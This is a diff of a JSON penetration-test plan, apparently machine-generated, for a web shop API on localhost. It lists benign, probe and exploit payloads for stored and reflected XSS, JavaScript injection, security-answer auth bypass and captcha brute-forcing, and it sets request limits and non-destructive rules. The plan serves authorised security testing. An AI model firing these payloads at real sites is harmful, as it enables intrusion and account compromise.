+      "notes": "Run after adding benign basket items. Clean up created items.",
+      "tags": [
+        "xss",
+        "basketitems"
+      ],
+      "estimated_duration": 240
+    },
+    {
+      "id": "TC-FEEDBACK-STORED-XSS-001",
+      "hypothesis_id": "POST /api/Feedbacks/ - comment reflected xss",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "/api/Feedbacks/",
+      "parameter": "comment",
+      "param_location": "body",
+      "payloads": [
+        {
+          "tier": "benign",
+          "value": "{\"comment\":\"This is feedback\",\"rating\":4}",
+          "description": "Baseline feedback submission",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "probe",
+          "value": "{\"comment\":\"INJECT_MARKER_{{RAND}}\",\"rating\":4}",
+          "description": "Probe to detect reflection in GET /api/Feedbacks/ or UI",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "exploit",
+          "value": "{\"comment\":\"<svg/onload=fetch('/__probe?m=INJECT_MARKER_{{RAND}}')>\",\"rating\":4}",
+          "description": "XSS payload to detect execution when feedback displayed",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "No auth required"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Probe marker appears in GET /api/Feedbacks/ responses or UI",
+          "threshold": {
+            "body_length_delta_pct": 20.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "xss_payload_executed",
+          "condition": "Payload executes when feedback displayed in UI (callback observed)",
           "weight": 1.0
         }
       ],
@@ -599,242 +869,62 @@
         "destructive_ok": false,
         "max_requests": 50
       },
-      "max_retries": 1,
-      "delay_between_requests": 1.0,
-      "notes": "Confirm execution only in isolated browser.",
+      "max_retries": 2,
+      "delay_between_requests": 1.5,
+      "notes": "Submit non-abusive content. Use markers and verify reflection.",
       "tags": [
         "xss",
-        "reflected"
+        "feedback"
       ],
-      "estimated_duration": 45
+      "estimated_duration": 300
     },
     {
-      "id": "address_injection_data_probe",
-      "hypothesis_id": "POST_/api/Addresss_/insecure_deserialization_or_injection_body_fields",
-      "method": "POST",
-      "endpoint": "/api/Addresss/",
-      "parameter": "data",
-      "param_location": "body",
-      "payloads": [
-        {
-          "tier": "benign",
-          "value": "{\"data\":\"normal\"}",
-          "description": "Baseline to capture normal response",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "probe",
-          "value": "{\"data\":\"INJECT_TEST_123\"}",
-          "description": "Probe for reflection or body size change",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "exploit",
-          "value": "{\"data\":\"\\\"; throw new Error('exploit'); //\"}",
-          "description": "Non-destructive attempt to trigger server error signatures",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        }
-      ],
-      "prerequisites": [
-        {
-          "type": "login",
-          "description": "Authenticated session required"
-        },
-        {
-          "type": "csrf_token",
-          "description": "CSRF token unknown; bind if observed on forms",
-          "bind_to": "csrf-token"
-        }
-      ],
-      "oracle_rules": [
-        {
-          "signal": "reflected_input",
-          "condition": "probe.value in response.body",
-          "threshold": {
-            "body_length_delta_pct": 20.0
-          },
-          "weight": 1.0
-        },
-        {
-          "signal": "response_length_diff",
-          "condition": "abs(len(response.body)-len(baseline.body))/max(1,len(baseline.body)) > 0.20",
-          "threshold": {
-            "body_length_delta_pct": 20.0
-          },
-          "weight": 1.0
-        },
-        {
-          "signal": "error_signature",
-          "condition": "regex_search(response.body,'(Traceback|Exception|SQL|syntax error|stack trace)')",
-          "weight": 1.0
-        }
-      ],
-      "pass_logic": "any",
-      "safety": {
-        "idempotent_required": true,
-        "destructive_ok": false,
-        "max_requests": 25
-      },
-      "max_retries": 1,
-      "delay_between_requests": 1.0,
-      "notes": "Start benign. Do not perform destructive deserialization exploits.",
-      "tags": [
-        "injection",
-        "insecure-deserialization"
-      ],
-      "estimated_duration": 60
-    },
-    {
-      "id": "cards_cardnum_probe",
-      "hypothesis_id": "POST_/api/Cards_/credit_card_field_injection",
-      "method": "POST",
-      "endpoint": "/api/Cards/",
-      "parameter": "cardNum",
-      "param_location": "body",
-      "payloads": [
-        {
-          "tier": "benign",
-          "value": "{\"cardNum\":\"4111111111111111\"}",
-          "description": "Baseline with test card number",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "probe",
-          "value": "{\"cardNum\":\"CC_ECHO_TEST_ABC123\"}",
-          "description": "Probe for reflection or leakage of card number",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        }
-      ],
-      "prerequisites": [
-        {
-          "type": "login",
-          "description": "Authenticated session required"
-        },
-        {
-          "type": "csrf_token",
-          "description": "Include CSRF token if required",
-          "bind_to": "csrf-token"
-        }
-      ],
-      "oracle_rules": [
-        {
-          "signal": "sensitive_data_exposed",
-          "condition": "probe.value appears in any response or other endpoints' responses",
-          "weight": 1.0
-        },
-        {
-          "signal": "reflected_input",
-          "condition": "probe.value in response.body OR abs(len(response.body)-len(baseline.body))/max(1,len(baseline.body)) > 0.10",
-          "threshold": {
-            "body_length_delta_pct": 10.0
-          },
-          "weight": 1.0
-        }
-      ],
-      "pass_logic": "any",
-      "safety": {
-        "idempotent_required": true,
-        "destructive_ok": false,
-        "max_requests": 10
-      },
-      "max_retries": 1,
-      "delay_between_requests": 1.0,
-      "notes": "Do not submit real card details. Use test card numbers only.",
-      "tags": [
-        "sensitive-data"
-      ],
-      "estimated_duration": 45
-    },
-    {
-      "id": "data_export_probe",
-      "hypothesis_id": "POST_/rest/user/data-export_sensitive_export_action",
-      "method": "POST",
-      "endpoint": "/rest/user/data-export",
-      "parameter": "format",
-      "param_location": "body",
-      "payloads": [
-        {
-          "tier": "benign",
-          "value": "{\"format\":\"json\",\"confirmation\":false}",
-          "description": "Baseline export with confirmation false",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "probe",
-          "value": "{\"format\":\"json\",\"confirmation\":true}",
-          "description": "Trigger export to detect large payloads; avoid downloading",
-          "encoding": "utf-8",
-          "content_type": "application/json"
-        }
-      ],
-      "prerequisites": [
-        {
-          "type": "login",
-          "description": "Authenticated session required"
-        }
-      ],
-      "oracle_rules": [
-        {
-          "signal": "sensitive_data_exposed",
-          "condition": "response contains PII patterns (emails, names) or file content headers",
-          "weight": 1.0
-        },
-        {
-          "signal": "response_length_diff",
-          "condition": "abs(len(probe.response.body)-len(baseline.response.body))/max(1,len(baseline.response.body)) > 0.50",
-          "threshold": {
-            "body_length_delta_pct": 50.0
-          },
-          "weight": 1.0
-        }
-      ],
-      "pass_logic": "any",
-      "safety": {
-        "idempotent_required": true,
-        "destructive_ok": false,
-        "max_requests": 10
-      },
-      "max_retries": 1,
-      "delay_between_requests": 2.0,
-      "notes": "Do not download or store exported PII; infer via headers and sizes only.",
-      "tags": [
-        "sensitive-data",
-        "export"
-      ],
-      "estimated_duration": 60
-    },
-    {
-      "id": "admin_config_probe",
-      "hypothesis_id": "GET_/rest/admin/application-configuration_info_disclosure_via_query",
+      "id": "TC-REVIEWS-REFLECTED-XSS-001",
+      "hypothesis_id": "GET /rest/products/:int/reviews - review message injection",
+      "base_url": "http://localhost:3000",
       "method": "GET",
-      "endpoint": "/rest/admin/application-configuration",
-      "parameter": "domain",
+      "endpoint": "/rest/products/:int/reviews",
+      "parameter": "message",
       "param_location": "query",
       "payloads": [
         {
           "tier": "benign",
-          "value": "?domain=example.com",
-          "description": "Baseline fetch of admin config (requires auth)",
+          "value": "/rest/products/1/reviews",
+          "description": "Baseline reviews fetch",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "probe",
+          "value": "/rest/products/1/reviews?message=INJECT_MARKER_{{RAND}}",
+          "description": "Probe to detect reflection in reviews listing",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "exploit",
+          "value": "/rest/products/1/reviews?message=<svg/onload=fetch('/__probe?m=INJECT_MARKER_{{RAND}}')>",
+          "description": "XSS probe to detect execution when reviews rendered",
           "encoding": "utf-8",
           "content_type": "application/json"
         }
       ],
       "prerequisites": [
         {
-          "type": "login",
-          "description": "Authenticated admin/session required"
+          "type": "custom",
+          "description": "No auth required"
         }
       ],
       "oracle_rules": [
         {
-          "signal": "sensitive_data_exposed",
-          "condition": "response.body contains config keys, urls, or PII (emails, secrets)",
+          "signal": "reflected_input",
+          "condition": "Probe marker appears in review listing responses or UI",
+          "threshold": {
+            "body_length_delta_pct": 20.0
+          },
+          "weight": 0.8
+        },
+        {
+          "signal": "xss_payload_executed",
+          "condition": "Injected payload executes when reviews are rendered (callback)",
           "weight": 1.0
         }
       ],
@@ -842,64 +932,244 @@
       "safety": {
         "idempotent_required": true,
         "destructive_ok": false,
-        "max_requests": 10
+        "max_requests": 50
       },
-      "max_retries": 1,
+      "max_retries": 2,
       "delay_between_requests": 1.0,
-      "notes": "Read-only; capture metadata only.",
+      "notes": "Use markers; avoid posting abusive messages.",
       "tags": [
-        "admin",
-        "info-disclosure"
+        "xss",
+        "reviews"
       ],
-      "estimated_duration": 30
+      "estimated_duration": 240
+    },
+    {
+      "id": "TC-ROOT-THEME-REFLECTED-XSS-001",
+      "hypothesis_id": "GET / - theme parameter reflected",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "/",
+      "parameter": "theme",
+      "param_location": "query",
+      "payloads": [
+        {
+          "tier": "benign",
+          "value": "/?theme=light",
+          "description": "Baseline homepage request",
+          "content_type": "text/html"
+        },
+        {
+          "tier": "probe",
+          "value": "/?theme=INJECT_MARKER_{{RAND}}",
+          "description": "Probe to detect theme reflection in HTML",
+          "content_type": "text/html"
+        },
+        {
+          "tier": "exploit",
+          "value": "/?theme=<svg/onload=fetch('/__probe?m=INJECT_MARKER_{{RAND}}')>",
+          "description": "XSS probe if theme is reflected into page HTML",
+          "encoding": "utf-8",
+          "content_type": "text/html"
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "Session cookie may be required; include if observed"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Probe marker present in returned HTML and increases body length by >15%",
+          "threshold": {
+            "body_length_delta_pct": 15.0
+          },
+          "weight": 0.7
+        },
+        {
+          "signal": "xss_payload_executed",
+          "condition": "Browser executes injected payload when homepage rendered (callback observed)",
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 30
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Perform during info-gathering. Use non-destructive probes.",
+      "tags": [
+        "xss",
+        "root"
+      ],
+      "estimated_duration": 180
+    },
+    {
+      "id": "TC-SEC-ANS-AUTHBYPASS-001",
+      "hypothesis_id": "POST /api/SecurityAnswers/ - answer leakage to auth bypass",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "/api/SecurityAnswers/",
+      "parameter": "answer",
+      "param_location": "body",
+      "payloads": [
+        {
+          "tier": "benign",
+          "value": "{\"SecurityQuestionId\":1,\"UserId\":1,\"answer\":\"testanswer\"}",
+          "description": "Baseline submit security answer",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        },
+        {
+          "tier": "probe",
+          "value": "{\"SecurityQuestionId\":1,\"UserId\":1,\"answer\":\"PROBE_ANS_{{RAND}}\"}",
+          "description": "Probe to detect if valid answer returns tokens or different status codes",
+          "encoding": "utf-8",
+          "content_type": "application/json"
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "Auth context may vary; follow observed flow (none or session)"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "sensitive_data_exposed",
+          "condition": "Submitting answers returns tokens or data enabling account recovery/access",
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "Different response codes (200 vs 401/403) indicate valid/invalid answers",
+          "threshold": {
+            "expected_codes": [
+              200,
+              401,
+              403
+            ]
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 30
+      },
+      "max_retries": 2,
+      "delay_between_requests": 2.0,
+      "notes": "Do not attempt account takeover. Use synthetic values.",
+      "tags": [
+        "auth",
+        "security_answers"
+      ],
+      "estimated_duration": 240
+    },
+    {
+      "id": "TC-IMAGE-CAPTCHA-BRUTE-001",
+      "hypothesis_id": "GET /rest/image-captcha/ - captcha endpoint brute-force detection",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "/rest/image-captcha/",
+      "parameter": "answer",
+      "param_location": "query",
+      "payloads": [
+        {
+          "tier": "benign",
+          "value": "/rest/image-captcha/",
+          "description": "Retrieve captcha image baseline",
+          "content_type": "image/png"
+        },
+        {
+          "tier": "probe",
+          "value": "/rest/image-captcha/?answer=guess1",
+          "description": "Limited repeated guesses to detect rate limiting/blocking",
+          "content_type": "image/png"
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "May require session cookie; include if observed",
+          "extract_from": "response.headers['set-cookie']",
+          "bind_to": "session_cookie"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Repeated attempts produce status codes like 429 or 403 compared to baseline 200",
+          "threshold": {
+            "expected_codes": [
+              200,
+              429,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "timing_anomaly",
+          "condition": "Solve/verification timing differs > 2000ms indicating captcha processing",
+          "threshold": {
+            "timing_ms": 2000
+          },
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 200
+      },
+      "max_retries": 5,
+      "delay_between_requests": 1.0,
+      "notes": "Controlled low-rate probes only. Stop on 429.",
+      "tags": [
+        "captcha",
+        "anti_automation"
+      ],
+      "estimated_duration": 300
     }
   ],
   "global_prerequisites": [
     {
       "type": "login",
-      "description": "Obtain authenticated session via /rest/user/login; bind cookie or bearer token"
-    },
-    {
-      "type": "csrf_token",
-      "description": "Extract CSRF token from login form and bind as needed",
-      "extract_from": "/rest/user/login GET response form",
-      "bind_to": "login_csrf"
+      "description": "Standard authentication: form_login observed; capture session cookie or Authorization bearer token from /rest/user/login",
+      "extract_from": "response.headers['set-cookie'] or response.headers['authorization']",
+      "bind_to": "session_cookie"
     }
   ],
   "execution_hints": [
     {
-      "key": "chain_order",
-      "value": "1) auth_flow_login -> gather_whoami -> high_priority_idor_basket_enumeration -> address_injection_data_probe -> basket_item_tampering_probe -> put_basketitems_idor_probe -> delete_basketitems_authz_probe -> cards_cardnum_probe -> data_export_probe -> admin_config_probe -> products_enumeration -> search_xss_probe -> challenges_xss_probe"
+      "key": "rate_limit_note",
+      "value": "Respect individual test max_requests. Insert delays (1-3s) between sensitive probes. Monitor for 429 responses and back off."
     },
     {
-      "key": "rate_limit",
-      "value": "Respect delays per test case; default 1-2s between state-changing probes, 0.5s for read-only enumeration."
+      "key": "csrf_note",
+      "value": "CSRF token presence unknown for some endpoints. Capture tokens from forms or JS prior to state-changing requests if present."
     },
     {
-      "key": "stop_conditions",
-      "value": "Stop current chain if repeated 403/401 for baseline or if server error rate increases above 5%."
-    },
-    {
-      "key": "observe_csrf",
-      "value": "Capture CSRF token during auth baseline and include for state-changing requests."
+      "key": "callback_listener",
+      "value": "Provide external callback endpoint for XSS payloads to detect execution (e.g., /__probe)."
     }
   ],
   "metadata": [
     {
+      "key": "generated_by",
+      "value": "offensive-spa-parser"
+    },
+    {
       "key": "session_management",
       "value": "cookie"
-    },
-    {
-      "key": "auth_flow",
-      "value": "form_login"
-    },
-    {
-      "key": "prioritization",
-      "value": "high-confidence IDOR and whoami first"
-    },
-    {
-      "key": "needs_observation",
-      "value": "true"
     }
   ]
 }
